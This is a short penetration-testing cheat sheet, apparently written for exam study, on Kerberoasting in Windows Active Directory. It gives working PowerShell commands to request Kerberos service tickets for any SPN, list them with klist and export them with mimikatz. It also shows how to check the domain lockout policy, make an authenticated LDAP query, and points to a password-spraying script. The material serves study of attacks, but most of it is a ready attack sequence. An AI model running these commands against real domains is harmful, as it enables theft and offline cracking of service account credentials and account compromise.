## Summary

when a user wants to access resources hosted by SPN a service ticket is requested from a the client to the domain controller, 

this is then decrypted and validated by application server, no checks are performed on weather the user has permission when requesting service ticket from domain controller, these checks are performed as second check only when connecting to service itself. 

so if we know SPN we can request service ticket.


- Adding module 

```powershell
Add-Type -AssemblyName System.IdentityModel
```


- Requesting service ticket for given SPN

```powershell
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList '<SPN>'
```

- get list of cached kerberos tickets

```powershell
klist
```

- mimikatz download service ticket

```cmd
kerberos::list /export
```

[Ref](https://hackersinterview.com/oscp/oscp-cheatsheet-windows-file-transfer-techniques/)



### Checking domain account policy

`net accounts`


### Tools

#### Manual search

```powershell
New-Object System.DirectoryServices.DirectoryEntry("LDAP://PDC/DC,DC", "<USERNAME>", "<PASSWORD>")
```

#### Attack

`spray-passwords.ps1`